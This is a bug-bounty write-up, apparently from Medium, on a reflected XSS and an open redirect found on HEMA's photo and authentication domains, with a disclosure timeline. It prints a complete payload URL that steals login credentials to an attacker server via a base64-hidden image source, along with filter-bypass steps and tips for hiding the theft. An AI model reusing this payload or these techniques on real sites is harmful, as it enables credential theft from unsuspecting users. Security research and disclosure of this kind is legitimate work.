---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-06_reflected-xss-at-fotoservicehemanl.md
original_filename: 2020-08-06_reflected-xss-at-fotoservicehemanl.md
title: Reflected XSS at fotoservice.hema.nl
category: documents
detected_topics:
- xss
- idor
- ssrf
- sqli
- command-injection
- otp
tags:
- imported
- documents
- xss
- idor
- ssrf
- sqli
- command-injection
- otp
language: en
raw_sha256: f9e7509433edeb501f5c0c33e8dd589c9b5e5823e42340eb6550de8c1a2725d0
text_sha256: ba86f3c05c42b536380cf3e04244b7e55299a25a400db629e3ac663c208acc0c
ingested_at: '2026-06-28T07:32:02Z'
sensitivity: unknown
redactions_applied: false
---

# Reflected XSS at fotoservice.hema.nl

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-06_reflected-xss-at-fotoservicehemanl.md
- Source Type: markdown
- Detected Topics: xss, idor, ssrf, sqli, command-injection, otp
- Ingested At: 2026-06-28T07:32:02Z
- Redactions Applied: False
- Raw SHA256: `f9e7509433edeb501f5c0c33e8dd589c9b5e5823e42340eb6550de8c1a2725d0`
- Text SHA256: `ba86f3c05c42b536380cf3e04244b7e55299a25a400db629e3ac663c208acc0c`


## Content

---
title: "Reflected XSS at fotoservice.hema.nl"
url: "https://medium.com/@jonathanbouman/reflected-xss-at-fotoservice-hema-nl-af344ef63433"
authors: ["Jonathan Bouman (@JonathanBouman)"]
programs: ["Hema"]
bugs: ["Reflected XSS", "Open redirect"]
publication_date: "2020-08-06"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4346
scraped_via: "browseros"
---

# Reflected XSS at fotoservice.hema.nl

Reflected XSS at fotoservice.hema.nl
Jonathan Bouman
Follow
11 min read
·
Aug 6, 2020

706

3

Press enter or click to view image in full size
Proof of concept. Above the browser. Below a private slack channel displaying the credentials.

Background
Reflected XSS bugs are great fun to find; they are everywhere and the impact can be big if the injected payload is carefully crafted.

Today we will try to find a Reflected XSS bug and craft a custom payload for it. We will run into certain restrictions and find good workarounds.

Hema.nl
One of the most indispensable brands in the Netherlands is HEMA. Hema is famous for its worst (sausage), their appeltaart (apple pie) and their variety stores that are nearly everywhere in The Netherlands.

A reflected XSS bug?

But, are we allowed to search their assets for bugs? Lets take a look at the English disclaimer. Hurray, we’re allowed to search for bugs and report them. We may even earn a reward. Let’s check the Dutch disclaimer; same story but some more details about the possible reward.

Press enter or click to view image in full size
Possible rewards: “A delicious HEMA apple pie!”.

So we might earn HEMA worst and appeltaart; lets see if we are able to convert our bugs into that!

Reconnaissance, where to start?
As a customer I am planning to order some photo prints today. This might be a good way to discover different domains used by HEMA. We turn on Burp Suite (community edition is fine) and start intercepting our traffic to the HEMA.nl servers.

Sometimes I start my recon by enumerating sub domains, sometimes I just start with the main website and look around for pages and (hidden) functionality. Burp Suite helps tremendously in creating a site map and scan for possible bugs.

Lets start a new project in Burp Suite, configure it and activate some interesting extensions!

Press enter or click to view image in full size
Start Burp Suite and configure it to only capture HEMA.nl traffic

If you watch carefully you see two of my favorite extensions, Param Miner and Paramalyzer.

Param Miner helps you discover hidden parameters in the query string and POST body. It will report any found parameters in the Issue Activity list.

Paramalyzer helps you by creating a site map of all the different parameters being used by the target; think of a list of all the endpoints that share a specific variable like userId. It helps you visualize the relations between different endpoints.

I owe James ‘albinowax’ Kettle, the author of the first extension, plenty of beers & HEMA worst / apple pies. The extension helped me to discover at least 70+ bugs in the last 6 months; some resulting in high payouts. James, if you’re reading this, ping me for some nice craft beers from Amsterdam!

Manual sitemap
So, back to business, back to earning our delicious HEMA Apple Pie. We now have our Burp Suite running & properly configured.

Some may suggest to create automated site maps by using the Burpsuite crawler functionality. I prefer to first crawl the site manually; it helps me in understanding the features of the site and the usage of different subdomains and endpoints.

Before we start, don’t forget to configure your Chrome browser to use Burp Suite as a proxy. I use the SwitchyOmega Chrome extension to easily switch the proxy setting on and off.

Press enter or click to view image in full size
Creating piece of the site map

Lets pretend we want to order some photo prints and see what happens:

The top menu on Hema.nl links the item Fotoservice (translated: photo services) to https://foto.hema.nl/, a sub domain used for their photo business.

While hunting for bugs it’s always good to look for patterns. Think of the used parameters in URLs, externally loaded sub domains and visual differences in the site itself. By just looking for visual differences between hema.nl and foto.hema.nl I discovered that in the user menu (top right) is different. It now offers you a link to Mijn fotoprojecten (translated: my photo projects).

Press enter or click to view image in full size
Press enter or click to view image in full size
Differences between the user menus, a link appears that allows you to manage photo projects

Lets click it, of course we want our own new photo project. The next page loaded is https://foto.hema.nl/mijn-hema/fotoprojecten/, a page containing different buttons that link to some authentication endpoint at auth.hema.digital Woops. We did not capture that one with our initial setup Target Scope in Burp Suite. Lets add this domain to our scope!

Press enter or click to view image in full size
Press enter or click to view image in full size
A link to an external domain used for authentication. Lets add it to our Burp Suite Target Scope.

Bonus #1: Open redirect bug at auth.hema.digital
If we look carefully we notice two query string parameters: delegation_url and token. Please fasten your seat belts whenever you see parameters that contain the characters URL. If we are able to manipulate the URL we might use it to create an open redirect (create an URL on the targets domain that redirects to our website, perfect for phishing) or sometimes even server side remote forgery (SSRF; let the server of our attacker render our supplied URL, bypassing firewalls and allowing you to lookup internal servers).

Press enter or click to view image in full size
The original request (censored my access_code).

Let’s change the URL to Protozoan.nl, and see if the location header is changed with our own domain.

Press enter or click to view image in full size
Press enter or click to view image in full size
Bingo! Open Redirect Bug. In the pocket, is this worth a HEMA Worst or Apple Pie?

As we can see from the response we have successfully injected our own URL into the endpoint https://auth.hema.digital/delegate and can now create an URL that’s handy to use for phishing. An experienced reader would also suggest that this is perfect for access code leaks (or shouts on Twitter: “Never burn an open redirect, it is perfect for chaining other bugs into a critical bug! Account take overs!”). However the auth.hema.digital/delegate requires a (secret) token itself, so I’m not sure how to escalate that. Feel free to share your thoughts in the comments and we might share an apple pie later!

Get Jonathan Bouman’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The original redirect goes to https://fotoservice.hema.nl/user/login.html?targetPage=https%3A%2F%2Ffotoservice.hema.nl%2Fcis%2Fitems.html%3Faccess_code%3Dcensored_code

Reflected XSS
Another parameter, targetPage, that contains an URL! Fasten your seat belts again. We have to inspect the source of the page and check how the value of this parameter is reflected in the source. We might be lucky today.

Press enter or click to view image in full size
Probing the targetPage parameter for values that might result in a reflected xss bug.

Here we have Burp Suite Repeater, allowing us to easily try out different values. Important to notice is that the value of this parameter is reflected inside a script tag block. We need to find a way to break out of the window.location.href='reflected parameter value' string, so JavaScript code that we provide will be executed in the browser of the victim

If you look closely you can see the steps I take until I finally found a way to execute our injected code.

Steps to victory
1. Inject ' to close the string, failed (it got url encoded). If it works your payload might be '+alert(1)+'
2. Inject </script> to close the script tag block, failed (some firewall rejects our request). If it works your payload might be </script><script>alert(1);
3. Repeat step 2. but URL encode the </script> value (%3c%2f%73%63%72%69%70%74%3e), failed (no reflection anymore)
4. Inject the payload <,> or %2F to discover how the server reacts, failed it refuses characters like these
5. Remove the starting part of the URL, success! It rewrites our input to /user/'reflected parameter value' and now without any URL encoding. Our ' is now rendered instead of the %27. What follows is a quick enumeration of different characters that might be of use for creating a powerful payload. The characters { } ( ) ; < > are enumerated and we discover that we can safely use the ( ) ; characters in our injection.
6. We create the (in)famous alert(1) payload for the proof of concept.

The handleLogin function we are able to manipulate is triggered after a successful login. Lets get creative. I already smell the HEMA Worst & Appeltaart in the far distance!

Final payload
This time we start with the final payload and dissect it step by step to understand how it works. The payload allows us to steal the username and password of the victim, it will be send to a private Slack Channel of the attacker, afterwards we redirect the user to a regular HEMA page so our victim does not notice anything at all.

It only requires us to trick the victim to open this specific URL containing the payload.

Payload URL: https://fotoservice.hema.nl/user/login.html?targetPage=%27;w=%27%23%27;window.stop();alert(%27Proof-of-Concept-by-Jonathan-Bouman%27);document.images[0].src=atob(%aHR0cHM6Ly95b3VyLW93bi1ibGluZC14c3Mtc2VydmVyL2hlbWEv/%27)%2bloginForm.login.value%2b%27%3a%27%2bloginForm.password.value;alert(%27Stolen-password%3a%27%2bloginForm.password.value%2b%27.Now-redirect-user.%27);setTimeout(%27window.location.href=window.location.hostname%27,3000);%27

Press enter or click to view image in full size
Final payload that steals the password (censored the URL of the attacker server)

Please take a look at the left part of the screen, the request is displayed. Our payload starts right after the targetPage= query parameter.

First have %27;, (%27 is the url encoding of ') it closes the string and ends the line with ;
The w=%27%23%27; part is interesting, it has no use in the javascript payload itself. However it adds a # to the URL and somehow the server side code acts differently if the targetPage parameter value contains a # in the string. If we add the # to the URL we are allowed to use the [] characters in our payload (necessary for step 5), otherwise the whole string will be stripped if it runs into [] characters. How I discovered this? Just by trying all different combinations of characters in the payload. Anyone a clue why this is happening? Leave a comment below!
window.stop() is a global javascript function that allows us to stop the originally initiated redirect to the page/user/. If we don’t stop the redirect the browser won’t have time to ex filtrate the credentials to our server.
alert is added so can we have some visual feedback that our payload is triggered.
document.images[0].src allows us to change the source of the first image loaded in the actual document. It will reload the image with the new source we define. This is a perfect way to ex-filtrate data out of a browser to an externally hosted domain. We can point the source of a random image to a server that is controlled by us.
=atob(%27aHR0cHM6Ly95b3VyLW93bi1ibGluZC14c3Mtc2VydmVyL2hlbWEv%27)%2bloginForm.login.value%2b%27%3a%27%2bloginForm.password.value; defines the URL that the image will try to load. What if we add the filled in password and username to this URL? That’s a good way to steal the user data! We can easily sniff the requested URLs on our server, or even better, forward the data to our Private Slack Channel. atob() is a function that decodes Base64 encoded strings. I often use this to hide suspicious looking strings and bypass firewalls that check for certain characters like ://@#{}<>, as Base64 only consists of letters and numbers. The decoded string is https://yourblindxss.server/hema/?, we will add the contents of the username field by pointing to its ID + .value, this results in loginForm.login.value and loginForm.password.value
alert(%27Stolen-password%3a%27%2bloginForm.password.value%2b%27.Now-redirect-user.%27);, a small alert pop-up that displays the stolen password, perfect for our proof of concept video.
setTimeout(%27window.location.href=window.location.hostname%27,3000);%27 will redirect the user after 3 seconds to the current hostname (fotoservice.hema.nl).

Remove all the alerts from the payload and nobody is aware that a password is stolen.

Send XSS data to your own private Slack Channel
Wouldn’t it be great if we got a push notification if our payload is triggered and receive the ex filtrated data? I agree, that would be great for the proof of concept! Head over to https://github.com/mazen160/xless and follow the instructions to setup your own server and Slack channel. This tool allows you to quickly deploy your own blind XSS server.

Proof of concept

Press enter or click to view image in full size
Above the Chrome Browser loading the reflected XSS payload. Below a Slack Channel that listens for leaked user credentials.

Limitations
The user needs to load the URL containing our payload. Our reflected XSS code is only triggered if a user is successfully logged in.

Discussion
HEMA is a great example of how to handle responsible disclosures. They have a properly written disclosure statement, are happy to receive bug reports (friendly and fast replies on the emails) and last but not least reward you with proper apple pies and in some cases gift cards / money.

Why hack a company that might be in heavy weather?
COVID-19 struck in the first quarter of 2020 and there were/are problems with their creditors. Some people might say: “Leave them alone!”

In my opinion it does not matter the situation of the company if there’s customer data at stake; the sooner bugs are discovered and resolved the better it is for everyone. It’s in the interest of everyone to protect the customer data. If a company handles the situation well it’s a win-win for all parties; the company avoided a potential breach, the customer data is protected, by publishing the report the public is informed that the company is taking bugs seriously. HEMA, keep up the good work!

Conclusion
We demonstrated an open redirect bug in the auth.hema.digital domain and a reflected XSS bug in the fotoservice.hema.nl domain. This might be used by an attacker to steal credentials from users who are tricked to open the URL containing our payload.

Solutions
The open redirect bug might be solved by using a whitelist of URLs. The reflected XSS bugs can be solved by properly encoding or escaping all the user input, a whitelist might be another option.

Reward
€100 HEMA gift card + a bonus (reward for reporting 5 reflected XSS bugs, a SQL injection bug and plenty of other bugs).

A gift card that we can now easily convert into Worst or ….

A delicious apple pie!
Disclaimer: No animals were harmed during the research of this bug.

Timeline
08–05–20 Discovered reflected XSS bug #1 & open redirect bug
09–05–20 Discovered reflected XSS bug #2, #3, #4 & #5
09–05–20 Written the report and shared the draft with HEMA by email
11–05–20 HEMA replied the email and confirmed the bugs
11–05–20 Discovered SQL Injection bug, sent new report to HEMA
14–05–20 HEMA rewarded €100 HEMA gift card
15–05–20 HEMA informed me the bugs are now resolved
17–05–20 Confirmed 2 fixes, but 2 bugs remain unresolved/bypassed
18–05–20 HEMA requested update from vendor
26–05–20 HEMA informed me that new fixes are now deployed
26–05–20 Confirmed 1 fix, 1 bug remain unresolved/bypassed
27–05–20 HEMA informed me that a new bug fix is deployed
27–05–20 Confirmed the bug fix, discovered bypass for open redirect bug
02–06–20 HEMA informed me that new fixes are now deployed
04–06–20 Confirmed new fix for open redirect
05–06–20 HEMA rewarded me a bonus for all the efforts made
06–08–20 Revised the report, published the report
